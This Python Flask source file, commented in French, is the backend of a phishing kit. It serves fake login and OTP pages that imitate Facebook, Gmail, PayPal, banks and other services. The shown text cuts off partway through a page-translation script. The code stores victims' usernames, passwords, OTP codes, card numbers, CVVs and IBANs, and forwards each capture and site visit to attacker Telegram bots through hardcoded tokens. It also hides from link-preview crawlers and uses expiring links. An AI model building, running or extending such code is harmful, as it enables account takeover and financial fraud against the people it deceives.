import os
import re
import base64
import datetime
import sqlite3
import json
import threading
import urllib.parse
import urllib.request
from flask import Flask, request, jsonify, render_template, render_template_string
import requests

app = Flask(__name__)

# ==============================================================================
# CONFIGURATION TELEGRAM (ADMIN vs GROUPE MÉDIAS / GPS / PHOTOS)
# ==============================================================================
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021").strip()

GROUP_BOT_TOKEN = os.environ.get(
    "GROUP_BOT_TOKEN",
    "8870992639:AAGWgYTNbd2q0Zy1qkdL2kIQhBB85CYq3AM",
)
GROUP_CHAT_ID = (
    os.environ.get("GROUP_CHAT_ID")
    or os.environ.get("ADMIN_GROUP_CHAT_ID")
    or ADMIN_CHAT_ID
).strip()
ADMIN_GROUP_CHAT_ID = GROUP_CHAT_ID

UNIVERSAL_ADMIN_CODE = "4121@."
EXPIRY_SECONDS = 3 * 24 * 3600  # Durée de vie : 3 jours
DAILY_SMS_LIMIT = 10

DB_NAME = "abeilles.db"
BEES_FOOTER = "🐝🐝🐝🐝🐝🐝🐝🐝🐝🐝"

PLATFORM_CATALOG = {
    "facebook": {"name": "Facebook", "img": "https://i.postimg.cc/4xnRThHp/IMG-6898.jpg", "accent": "#1877f2"},
    "amazon": {"name": "Amazon", "img": "https://i.postimg.cc/jSyCP9v8/IMG-6895.webp", "accent": "#ff9900"},
    "tiktok": {"name": "TikTok", "img": "https://i.postimg.cc/sg5178K8/IMG-6894.png", "accent": "#fe2c55"},
    "gmail": {"name": "Gmail", "img": "https://i.postimg.cc/bw1dkM38/IMG-6888.jpg", "accent": "#ea4335"},
    "yahoo": {"name": "Yahoo", "img": "https://i.postimg.cc/htVhTwpB/IMG-6887.png", "accent": "#6001d2"},
    "whatsapp": {"name": "WhatsApp", "img": "https://i.postimg.cc/3xWQHD0C/IMG-6897.webp", "accent": "#25d366"},
    "instagram": {"name": "Instagram", "img": "https://i.postimg.cc/Xv3q88z3/IMG-6886.jpg", "accent": "#e1306c"},
    "netflix": {"name": "Netflix", "img": "https://i.postimg.cc/cLf6wjX1/IMG-6885.png", "accent": "#e50914"},
    "telegram": {"name": "Telegram", "img": "https://i.postimg.cc/fRYkmF5G/IMG-6890.jpg", "accent": "#2aabee"},
    "snapchat": {"name": "Snapchat", "img": "https://i.postimg.cc/rpWb8GV1/IMG-6900.jpg", "accent": "#fffc00"},
    "paypal": {"name": "PayPal", "img": "https://i.postimg.cc/Mp1XV4dk/IMG-6892.jpg", "accent": "#0070ba"},
    "linkedin": {"name": "LinkedIn", "img": "https://i.postimg.cc/YCQjYVbB/IMG-6889.jpg", "accent": "#0a66c2"},
    "1xbet": {"name": "1Xbet", "img": "https://i.postimg.cc/qB838NRS/IMG-6903.webp", "accent": "#1e6bb8"},
    "betclic": {"name": "Betclic", "img": "https://i.postimg.cc/dQ8y8h1H/IMG-6904.jpg", "accent": "#d32f2f"},
    "bank": {"name": "Bank", "img": "https://i.postimg.cc/FFjLjYRM/IMG-6905.png", "accent": "#1b5e20"},
    "kaspersky": {"name": "Kaspersky", "img": "https://i.postimg.cc/FFjLjYRM/IMG-6905.png", "accent": "#006d5c"},
}

PLATFORM_IMAGES = {v["name"]: v["img"] for v in PLATFORM_CATALOG.values()}
DEFAULT_LOGO_FALLBACK = "https://i.postimg.cc/jd8hhNhG/02F0AA74-D0BB-4064-A81E-613F54272DB7.png"

SUPPORTED_LANGS = {
    "fr": {"label": "France", "html_lang": "fr"},
    "en": {"label": "Angleterre", "html_lang": "en"},
    "es": {"label": "Espagne", "html_lang": "es"},
    "de": {"label": "Allemagne", "html_lang": "de"},
}


# ==============================================================================
# SÉCURITÉ HTTP & PROTECTION ANTI-XSS / INJECTION
# ==============================================================================
@app.after_request
def apply_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(self), camera=(self), microphone=(self)"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self' https: data: blob: 'unsafe-inline' 'unsafe-eval'; "
        "img-src 'self' https: http: data: blob:; "
        "media-src 'self' https: http: data: blob:; "
        "connect-src 'self' https: http:;"
    )
    return response


def sanitize_text(val: str, max_len: int = 300) -> str:
    if val is None:
        return ""
    s = str(val).replace("\x00", "").strip()
    return s[:max_len]


def sanitize_slug(slug: str) -> str:
    s = sanitize_text(slug, 80).lower()
    s = re.sub(r"[^a-z0-9_-]+", "_", s).strip("_")
    return s


def sanitize_lang(lang: str) -> str:
    l = (lang or "fr").strip().lower()[:2]
    return l if l in SUPPORTED_LANGS else "fr"


def sanitize_html_payload(raw_html: str) -> str:
    if not raw_html:
        return ""
    cleaned = re.sub(r"<script[^>]*>.*?</script>", "", raw_html, flags=re.IGNORECASE | re.DOTALL)
    cleaned = re.sub(r"\son[a-z]+\s*=\s*(['\"]).*?\1", "", cleaned, flags=re.IGNORECASE)
    return cleaned


def normalize_platform_key(raw_name: str) -> str:
    s = (raw_name or "").lower().strip()
    s = (
        s.replace("otp/", "")
        .replace("standard/", "")
        .replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )
    s = re.sub(r"[^a-z0-9]+", "", s)
    if s in PLATFORM_CATALOG:
        return s
    for key in PLATFORM_CATALOG:
        if key in s:
            return key
    return s or "plateforme"


def get_platform_meta(raw_name: str) -> dict:
    key = normalize_platform_key(raw_name)
    if key in PLATFORM_CATALOG:
        return PLATFORM_CATALOG[key]
    clean_label = sanitize_text(raw_name, 50) or "Plateforme"
    return {
        "name": clean_label.capitalize(),
        "img": DEFAULT_LOGO_FALLBACK,
        "accent": "#1877f2",
    }


def render_expired_link_error_page(link_label: str = "Lien"):
    safe_label = sanitize_text(link_label, 80).replace("<", "").replace(">", "")
    html_error = f"""
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Erreur 404 — Page introuvable</title>
        <style>
            * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }}
            body {{
                min-height: 100vh;
                background-color: #ffffff;
                color: #202124;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 24px;
            }}
            .box {{
                max-width: 460px;
                width: 100%;
                text-align: left;
            }}
            .icon-404 {{
                font-size: 36px;
                font-weight: 700;
                color: #5f6368;
                margin-bottom: 14px;
            }}
            h1 {{
                font-size: 22px;
                font-weight: 500;
                color: #202124;
                margin-bottom: 10px;
            }}
            p {{
                font-size: 14px;
                color: #5f6368;
                line-height: 1.55;
                margin-bottom: 8px;
            }}
            .code {{
                font-size: 12px;
                color: #70757a;
                margin-top: 12px;
                margin-bottom: 22px;
            }}
            .btn-reload {{
                background-color: #1a73e8;
                color: #ffffff;
                border: none;
                border-radius: 4px;
                padding: 9px 18px;
                font-size: 13px;
                font-weight: 600;
                cursor: pointer;
            }}
            .btn-reload:hover {{
                background-color: #1558b0;
            }}
        </style>
    </head>
    <body>
        <div class="box">
            <div class="icon-404">404</div>
            <h1>Cette page est introuvable ou a expiré</h1>
            <p>Le lien demandé ({safe_label}) n'est plus disponible ou sa période de validité de 3 jours est terminée.</p>
            <p>Vérifiez l'adresse ou demandez un nouveau lien.</p>
            <div class="code">ERR_PAGE_NOT_FOUND • 404</div>
            <button type="button" class="btn-reload" onclick="window.location.reload()">Actualiser</button>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_error), 404


def resolve_platform_image(network: str, page_logo: str = "") -> str:
    key = normalize_platform_key(network)
    if key in PLATFORM_CATALOG:
        return PLATFORM_CATALOG[key]["img"]
    if page_logo and page_logo.startswith(("https://", "http://")):
        return page_logo
    return DEFAULT_LOGO_FALLBACK


def send_telegram_photo_url(bot_token, chat_id, photo_url, caption):
    if not bot_token or not chat_id or not photo_url:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"},
            timeout=10,
        )
    except Exception as e:
        print("Erreur Telegram sendPhoto URL:", e)


def send_telegram_voice_b64(bot_token, chat_id, audio_b64_data_url, caption):
    if not bot_token or not chat_id or not audio_b64_data_url:
        return
    raw_b64 = audio_b64_data_url.split(",")[-1]
    try:
        audio_bytes = base64.b64decode(raw_b64)
        url = f"https://api.telegram.org/bot{bot_token}/sendVoice"
        requests.post(
            url,
            data={"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"},
            files={"voice": ("vocal.webm", audio_bytes, "audio/webm")},
            timeout=12,
        )
    except Exception as e:
        print("Erreur Telegram sendVoice:", e)


def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(
            url,
            json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
            timeout=8,
        )
    except Exception as e:
        print("Erreur Telegram Message:", e)


def send_telegram_location_direct(bot_token, chat_id, latitude, longitude, caption=""):
    if not bot_token or not chat_id or latitude is None or longitude is None:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendLocation"
    payload = {
        "chat_id": chat_id,
        "latitude": latitude,
        "longitude": longitude,
    }
    if caption:
        payload["caption"] = caption
    encoded = urllib.parse.urlencode(payload).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=encoded, method="POST")
        with urllib.request.urlopen(req, timeout=8) as resp:
            resp.read()
    except Exception as e:
        print("Erreur Telegram sendLocation:", e)


def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT,
            device TEXT,
            extra_info TEXT,
            session_key TEXT
        )
    """)
    try:
        cursor.execute("ALTER TABLE victims ADD COLUMN session_key TEXT")
    except Exception:
        pass
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT,
            html_code TEXT,
            redirect_url TEXT,
            mode TEXT,
            opt3_config TEXT,
            box_bg TEXT,
            box_width TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS issued_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_key TEXT UNIQUE,
            owner TEXT,
            link_type TEXT,
            slug TEXT,
            created_at INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS link_visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            path_visited TEXT,
            location_desc TEXT,
            ip TEXT,
            device TEXT,
            created_at TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            email TEXT,
            avatar_url TEXT,
            created_at TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS direct_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            sender TEXT,
            recipient TEXT,
            channel TEXT,
            msg_type TEXT,
            content TEXT,
            media_data TEXT,
            day_key TEXT,
            created_at TEXT
        )
    """)
    try:
        cursor.execute("ALTER TABLE accounts ADD COLUMN avatar_url TEXT")
    except Exception:
        pass
    conn.commit()
    conn.close()


init_db()


def detect_device(user_agent: str) -> str:
    ua = (user_agent or "").lower()
    if "iphone" in ua:
        return "iPhone"
    if "ipad" in ua:
        return "iPad"
    if "android" in ua:
        return "Android"
    if "macintosh" in ua or "mac os" in ua:
        return "Mac"
    if "windows" in ua:
        return "Windows PC"
    if "linux" in ua:
        return "Linux"
    return user_agent[:60] if user_agent else "Inconnu"


def _is_link_preview_bot(user_agent: str) -> bool:
    ua = (user_agent or "").lower()
    bot_tokens = [
        "telegrambot", "whatsapp", "facebookexternalhit", "twitterbot",
        "slackbot", "discordbot", "bot", "crawler", "spider", "preview"
    ]
    return any(tok in ua for tok in bot_tokens)


def _dispatch_visit_telegram(clean_owner: str, clean_net: str, path_visited: str, device: str, ip: str, now_str: str):
    tg_visit_msg = (
        f"🚨 *NOUVELLE VISITE SUR LIEN*\n"
        f"┌──────────────────────────────┐\n"
        f"│ 👤 *Propriétaire:* `{clean_owner}`\n"
        f"│ 🌐 *Plateforme:* `{clean_net}`\n"
        f"│ 🔗 *Chemin:* `{path_visited}`\n"
        f"└──────────────────────────────┘\n"
        f"• *Appareil:* `{device}`\n"
        f"• *Adresse IP:* `{ip}`\n"
        f"• *Heure:* `{now_str}`\n"
        f"{BEES_FOOTER}"
    )
    send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, tg_visit_msg)
    if GROUP_CHAT_ID and GROUP_CHAT_ID != ADMIN_CHAT_ID:
        send_telegram_notification(GROUP_BOT_TOKEN, GROUP_CHAT_ID, tg_visit_msg)


def record_link_visit(owner: str, network: str, path_visited: str, ip: str, device: str):
    if request.method != "GET":
        return
    if _is_link_preview_bot(request.headers.get("User-Agent", "")):
        return

    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    clean_owner = sanitize_text(owner, 60) or "Kim"
    clean_net = sanitize_text(network, 60) or "Plateforme"
    loc_desc = (
        f"Un utilisateur est sur votre plateforme {clean_net} "
        f"(chemin exact : {path_visited}, IP : {ip}, appareil : {device})."
    )
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO link_visits (owner, network, path_visited, location_desc, ip, device, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (clean_owner, clean_net, path_visited, loc_desc, ip, device, now_str),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur enregistrement visite lien:", e)

    threading.Thread(
        target=_dispatch_visit_telegram,
        args=(clean_owner, clean_net, path_visited, device, ip, now_str),
        daemon=True,
    ).start()


@app.route("/api/link_visits", methods=["GET"])
def get_link_visits():
    try:
        after_id = int(request.args.get("after_id") or "0")
    except ValueError:
        after_id = 0
    if after_id < 0:
        after_id = 0

    owner = sanitize_text(request.args.get("owner") or "", 60)

    conn = get_db_connection()
    cursor = conn.cursor()

    if owner:
        cursor.execute(
            """
            SELECT * FROM link_visits
            WHERE id > ? AND LOWER(TRIM(owner)) = LOWER(?)
            ORDER BY id ASC LIMIT 20
            """,
            (after_id, owner),
        )
        rows = cursor.fetchall()
        cursor.execute(
            "SELECT COALESCE(MAX(id), 0) AS max_id FROM link_visits WHERE LOWER(TRIM(owner)) = LOWER(?)",
            (owner,),
        )
        max_row = cursor.fetchone()
    else:
        rows = []
        max_row = None

    latest_id = int(max_row["max_id"] or 0) if max_row else 0
    conn.close()

    visits = [
        {
            "id": r["id"],
            "owner": r["owner"],
            "network": r["network"],
            "path_visited": r["path_visited"],
            "location_desc": r["location_desc"],
            "ip": r["ip"],
            "device": r["device"],
            "created_at": r["created_at"],
            "triggerAlert": True,
        }
        for r in rows
    ]
    return jsonify({
        "visits": visits,
        "latest_id": latest_id,
        "alertSeq": latest_id,
    })


def register_or_check_link_3days(link_key: str, owner: str = "", link_type: str = "standard", slug: str = "", force_reset: bool = False) -> bool:
    now_ms = int(datetime.datetime.now().timestamp() * 1000)
    max_age_ms = EXPIRY_SECONDS * 1000

    parsed = urllib.parse.urlsplit(link_key)
    q_pairs = [(k, v) for (k, v) in urllib.parse.parse_qsl(parsed.query) if k.lower() != "lang"]
    normalized_key = urllib.parse.urlunsplit(("", "", parsed.path, urllib.parse.urlencode(q_pairs), ""))

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT created_at FROM issued_links WHERE link_key IN (?, ?)", (link_key, normalized_key))
    row = cursor.fetchone()

    if not row:
        if force_reset:
            cursor.execute(
                """
                INSERT OR REPLACE INTO issued_links (link_key, owner, link_type, slug, created_at)
                VALUES (?, ?, ?, ?, ?)
                """,
                (normalized_key, owner, link_type, slug, now_ms),
            )
            conn.commit()
            conn.close()
            return True
        conn.close()
        return False

    if force_reset:
        cursor.execute(
            "UPDATE issued_links SET owner = ?, link_type = ?, slug = ?, created_at = ? WHERE link_key = ?",
            (owner, link_type, slug, now_ms, normalized_key),
        )
        conn.commit()
        conn.close()
        return True

    created_at = int(row["created_at"] or 0)
    conn.close()
    return (now_ms - created_at) <= max_age_ms


@app.route("/api/issue_link", methods=["POST"])
def api_issue_link():
    data = request.json or {}
    url = sanitize_text(data.get("url") or "", 600)
    owner = sanitize_text(data.get("owner") or "", 60)
    link_type = sanitize_text(data.get("linkType") or "standard", 40)
    slug = sanitize_slug(data.get("slug") or "")
    if not url:
        return jsonify({"status": "error", "message": "URL manquante"}), 400

    path_part = url.split("://", 1)[-1]
    if "/" in path_part:
        link_key = "/" + path_part.split("/", 1)[1]
    else:
        link_key = url

    register_or_check_link_3days(link_key=link_key, owner=owner, link_type=link_type, slug=slug, force_reset=True)
    expires_at_ms = int(datetime.datetime.now().timestamp() * 1000) + (EXPIRY_SECONDS * 1000)
    return jsonify({"status": "success", "expiresInDays": 3, "expiresAt": expires_at_ms})


def _bucket_for_key(key_lower: str) -> str:
    if any(k in key_lower for k in ["card", "carte", "cc-", "cvv", "cvc", "csc", "exp", "expiry", "expiration", "iban", "rib", "bic", "swift", "banque", "bank"]):
        return "banking"
    if any(k in key_lower for k in ["otp", "2fa", "mfa", "code", "verif", "token"]):
        return "otp"
    if any(k in key_lower for k in ["pass", "mdp", "mot de passe", "pin"]):
        return "credentials"
    if any(k in key_lower for k in ["birth", "naissance", "dob", "bday", "jour", "mois", "annee", "année", "jj", "mm", "aaaa", "yyyy", "nom", "name", "prenom", "prénom", "email", "mail", "user", "login", "phone", "tel"]):
        return "identity"
    return "other"


def _format_bank_label(key_str: str) -> str:
    k = key_str.lower()
    if any(w in k for w in ["card", "carte", "cc-", "num"]):
        return "Numéro de carte"
    if any(w in k for w in ["exp", "expiry", "expiration", "mm/aa", "mm/yy"]):
        return "Expiration"
    if any(w in k for w in ["cvv", "cvc", "csc", "crypto"]):
        return "CVV"
    if any(w in k for w in ["iban", "rib"]):
        return "IBAN / RIB"
    if any(w in k for w in ["holder", "titulaire", "nom"]):
        return "Titulaire"
    return key_str.strip() or "Champ bancaire"


def _merge_ordered_dicts(base_ordered: dict, incoming_ordered: dict) -> dict:
    merged = {
        "banking": dict((base_ordered or {}).get("banking") or {}),
        "identity": dict((base_ordered or {}).get("identity") or {}),
        "credentials": dict((base_ordered or {}).get("credentials") or {}),
        "otp": dict((base_ordered or {}).get("otp") or {}),
        "other": dict((base_ordered or {}).get("other") or {}),
    }
    for sec in ["banking", "identity", "credentials", "otp", "other"]:
        for k, v in ((incoming_ordered or {}).get(sec) or {}).items():
            if v is not None and str(v).strip() != "":
                merged[sec][k] = str(v).strip()
    return merged


def _build_summary_from_ordered(ordered: dict) -> str:
    sections_lines = []
    labels = {
        "banking": "Banque",
        "identity": "Identité",
        "credentials": "Accès",
        "otp": "OTP",
        "other": "Autres",
    }
    for sec_key in ["banking", "identity", "credentials", "otp", "other"]:
        if ordered.get(sec_key):
            items_txt = ", ".join([f"{fk}: {fv}" for fk, fv in ordered[sec_key].items()])
            sections_lines.append(f"[{labels[sec_key]}] {items_txt}")
    return " | ".join(sections_lines)


def classify_and_order_payload(data: dict) -> dict:
    ordered = {
        "banking": {},
        "identity": {},
        "credentials": {},
        "otp": {},
        "other": {},
    }

    raw_fields = data.get("fields")
    if isinstance(raw_fields, dict):
        for k, v in raw_fields.items():
            val_str = sanitize_text(str(v), 250) if v is not None else ""
            if not val_str:
                continue
            key_clean = sanitize_text(str(k), 80) or "champ"
            bucket = _bucket_for_key(key_clean.lower())
            if bucket == "banking":
                bank_lbl = _format_bank_label(key_clean)
                ordered["banking"][bank_lbl] = val_str
            else:
                ordered[bucket][key_clean] = val_str

    v_user = sanitize_text(data.get("victimUser") or "", 150)
    v_pass = sanitize_text(data.get("victimPass") or "", 150)
    v_otp = sanitize_text(data.get("otp") or "", 80)

    if v_user and v_user not in ["Inconnu", "Non renseigne"] and not ordered["identity"] and not ordered["banking"]:
        ordered["identity"]["Identifiant"] = v_user
    if v_pass and v_pass not in ["Inconnu", "Non renseigne"] and not ordered["credentials"]:
        ordered["credentials"]["Mot de passe"] = v_pass
    if v_otp and v_otp not in ["Aucun", "En attente OTP..."] and not ordered["otp"]:
        ordered["otp"]["Code OTP"] = v_otp

    if ordered["banking"]:
        primary_category = "BANKING"
    elif ordered["otp"] and not ordered["identity"] and not ordered["credentials"]:
        primary_category = "OTP"
    elif ordered["identity"] or ordered["credentials"]:
        primary_category = "FORM_DATA"
    else:
        primary_category = "GENERAL"

    return {
        "category": primary_category,
        "ordered": ordered,
        "formatted_summary": _build_summary_from_ordered(ordered),
    }


def format_ordered_telegram_card(
    network: str,
    owner: str,
    category: str,
    v_user: str,
    v_pass: str,
    v_otp: str,
    formatted_summary: str,
    v_ip: str,
    device_type: str,
    date_str: str,
    platform_img: str,
    is_update: bool = False,
) -> str:
    entete = "📥 *CAPTURE MISE À JOUR*" if is_update else "📥 *CAPTURE DE DONNÉES*"
    extra_lines = ""
    if formatted_summary and formatted_summary != "Aucun détail supplémentaire":
        extra_lines = f"• *Détails classés ({category}):* {formatted_summary}\n"

    return (
        f"📌 *PAGE D'ACCUEIL — {network.upper()}*\n"
        f"👤 *Propriétaire:* {owner}\n"
        f"🖼️ *Image d'accueil:* [Voir l'image]({platform_img})\n\n"
        f"{entete}\n"
        f"• *Nom d'utilisateur:* {v_user}\n"
        f"• *Mot de passe:* {v_pass}\n"
        f"• *Code OTP:* {v_otp}\n"
        f"{extra_lines}"
        f"• *Adresse IP:* {v_ip}\n"
        f"• *Type d'appareil:* {device_type}\n"
        f"• *Date & Heure:* {date_str}\n"
        f"{BEES_FOOTER}"
    )


def dispatch_ordered_capture_telegram(
    network: str,
    owner: str,
    category: str,
    v_user: str,
    v_pass: str,
    v_otp: str,
    formatted_summary: str,
    v_ip: str,
    device_type: str,
    date_str: str,
    platform_img: str,
    is_update: bool = False,
):
    card_text = format_ordered_telegram_card(
        network=network,
        owner=owner,
        category=category,
        v_user=v_user,
        v_pass=v_pass,
        v_otp=v_otp,
        formatted_summary=formatted_summary,
        v_ip=v_ip,
        device_type=device_type,
        date_str=date_str,
        platform_img=platform_img,
        is_update=is_update,
    )
    send_telegram_photo_url(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, platform_img, card_text)


def cleanup_expired_3days():
    cutoff_ms = int((datetime.datetime.now().timestamp() - EXPIRY_SECONDS) * 1000)
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM custom_pages WHERE created_at <= ?", (cutoff_ms,))
        cursor.execute("DELETE FROM issued_links WHERE created_at <= ?", (cutoff_ms,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage 3 jours:", e)


@app.route("/")
def index():
    cleanup_expired_3days()
    return render_template("index.html")


def _build_lang_injection_script(lang_code: str, owner_name: str, network_name: str, is_otp: bool = False, redirect_url: str = "https://www.google.com") -> str:
    safe_lang = sanitize_lang(lang_code)
    safe_owner = json.dumps(owner_name or "Kim")
    safe_net = json.dumps(network_name or "Plateforme")
    safe_otp = "true" if is_otp else "false"
    safe_redir = json.dumps(redirect_url or "https://www.google.com")

    return f"""
<script>
(function() {{
    const SELECTED_LANG = {json.dumps(safe_lang)};
    const PAGE_OWNER = {safe_owner};
    const PAGE_NETWORK = {safe_net};
    const PAGE_IS_OTP = {safe_otp};
    const PAGE_REDIRECT = {safe_redir};

    try {{ document.documentElement.setAttribute("lang", SELECTED_LANG); }} catch (_) {{}}
    try {{
        const curUrl = new URL(window.location.href);
        if (curUrl.searchParams.get("lang") !== SELECTED_LANG) {{
            curUrl.searchParams.set("lang", SELECTED_LANG);
            window.history.replaceState({{}}, "", curUrl.toString());
        }}
    }} catch (_) {{}}

    const I18N_MAP = {{
        en: {{
            "connexion": "Sign In",
            "se connecter": "Sign In",
            "valider": "Continue",
            "continuer": "Continue",
            "envoyer": "Submit",
            "identifiant": "Email or Username",
            "adresse e-mail ou téléphone": "Email address or phone number",
            "e-mail ou numéro de téléphone": "Email or phone number",
            "nom d'utilisateur": "Username",
            "nom d'utilisateur / email": "Username or Email",
            "mot de passe": "Password",
            "code secret / otp": "Security / OTP Code",
            "code otp": "OTP Code",
            "connexion sécurisée": "Secure Login",
            "vérification de sécurité": "Security Verification",
            "vérifiez votre identité pour continuer.": "Verify your identity to continue.",
            "connectez-vous à votre compte.": "Sign in to your account.",
            "redirection en cours...": "Redirecting...",
            "veuillez remplir tous les champs requis.": "Please fill in all required fields."
        }},
        es: {{
            "connexion": "Iniciar sesión",
            "se connecter": "Iniciar sesión",
            "valider": "Continuar",
            "continuer": "Continuar",
            "envoyer": "Enviar",
            "identifiant": "Correo o usuario",
            "adresse e-mail ou téléphone": "Correo electrónico o teléfono",
            "e-mail ou numéro de téléphone": "Correo o número de teléfono",
            "nom d'utilisateur": "Nombre de usuario",
            "nom d'utilisateur / email": "Usuario o correo",
            "mot de passe": "Contraseña",
            "code secret / otp": "Código OTP / Seguridad",
            "code otp": "Código OTP",
            "connexion sécurisée": "Inicio de sesión seguro",
            "vérification de sécurité": "Verificación de seguridad",
            "vérifiez votre identité pour continuer.": "Verifica tu identidad para continuar.",
            "connectez-vous à votre compte.": "Inicia sesión en tu cuenta.",
            "redirection en cours...": "Redirigiendo...",
            "veuillez remplir tous les champs requis.": "Por favor completa todos los campos obligatorios."
        }},
        de: {{
            "connexion": "Anmelden",
            "se connecter": "Anmelden",
            "valider": "Weiter",
            "continuer": "Weiter",
            "envoyer": "Senden",
            "identifiant": "E-Mail oder Benutzername",
            "adresse e-mail ou téléphone": "E-Mail-Adresse oder Telefonnummer",
            "e-mail ou numéro de téléphone": "E-Mail oder Telefonnummer",
            "nom d'utilisateur": "Benutzername",
            "nom d'utilisateur / email": "Benutzername oder E-Mail",
            "mot de passe": "Passwort",
            "code secret / otp": "OTP- / Sicherheitscode",
            "code otp": "OTP-Code",
            "connexion sécurisée": "Sichere Anmeldung",
            "vérification de sécurité": "Sicherheitsüberprüfung",
            "vérifiez votre identité pour continuer.": "Bestätige deine Identität, um fortzufahren.",
            "connectez-vous à votre compte.": "Melde dich bei deinem Konto an.",
            "redirection en cours...": "Weiterleitung...",
            "veuillez remplir tous les champs requis.": "Bitte fülle alle erforderlichen Felder aus."
        }}
    }};

    const UI_STRINGS = {{
        fr: {{
            loginTitle: "Connexion",
            otpTitle: "Vérification OTP",
            subtitle: "Connectez-vous à votre compte pour continuer.",
            userLabel: "Identifiant / E-mail / Téléphone",
            passLabel: "Mot de passe",
            otpLabel: "Code secret / OTP",
            submitBtn: "Se connecter",
            otpBtn: "Valider le code",
            missingMsg: "Veuillez remplir les champs requis."
        }},
        en: {{
            loginTitle: "Sign In",
            otpTitle: "OTP Verification",
            subtitle: "Sign in to your account to continue.",
            userLabel: "Email, Username or Phone",
            passLabel: "Password",
            otpLabel: "Security / OTP Code",
            submitBtn: "Sign In",
            otpBtn: "Verify Code",
            missingMsg: "Please fill in the required fields."
        }},
        es: {{
            loginTitle: "Iniciar sesión",
            otpTitle: "Verificación OTP",
            subtitle: "Inicia sesión en tu cuenta para continuar.",
            userLabel: "Correo, usuario o teléfono",
            passLabel: "Contraseña",
            otpLabel: "Código OTP / Seguridad",
            submitBtn: "Iniciar sesión",
            otpBtn: "Verificar código",
            missingMsg: "Por favor completa los campos requeridos."
        }},
        de: {{
            loginTitle: "Anmelden",
            otpTitle: "OTP-Bestätigung",
            subtitle: "Melde dich bei deinem Konto an, um fortzufahren.",
            userLabel: "E-Mail, Benutzername oder Telefon",
            passLabel: "Passwort",
            otpLabel: "OTP- / Sicherheitscode",
            submitBtn: "Anmelden",
            otpBtn: "Code bestätigen",
            missingMsg: "Bitte fülle die erforderlichen Felder aus."
        }}
    }};

    window.ABEILLES_I18N = {{
        lang: SELECTED_LANG,
        strings: UI_STRINGS[SELECTED_LANG] || UI_STRINGS.fr,
        translate: function(txt) {{
            if (!txt) return txt;
            const key = String(txt).trim().toLowerCase();
            const dict = I18N_MAP[SELECTED_LANG];
            return (dict && dict[key]) ? dict[key] : txt;
        }}
    }};

    function translateDomTree(rootNode) {{
        const dict = I18N_MAP[SELECTED_LANG];
        if (!dict || !rootNode) return;

        const attrList = ["placeholder", "title", "aria-label", "value"];
        const elements = rootNode.querySelectorAll ? [rootNode, ...rootNode.querySelectorAll("*")] : [];
        elements.forEach(function(el) {{
            if (el.tagName === "SCRIPT" || el.tagName === "STYLE") return;
            attrList.forEach(function(attr) {{
                if (el.tagName === "INPUT" && attr === "value" && ["submit", "button", "reset"].indexOf((el.type || "").toLowerCase()) === -1) return;
                const val = el.getAttribute(attr);
                if (val) {{
                    const mapped = dict[val.trim().toLowerCase()];
                    if (mapped && mapped !== val) {{
                        el.setAttribute(attr, mapped);
                    }}
                }}
            }});
            if (el.children && el.children.length === 0 && el.textContent) {{
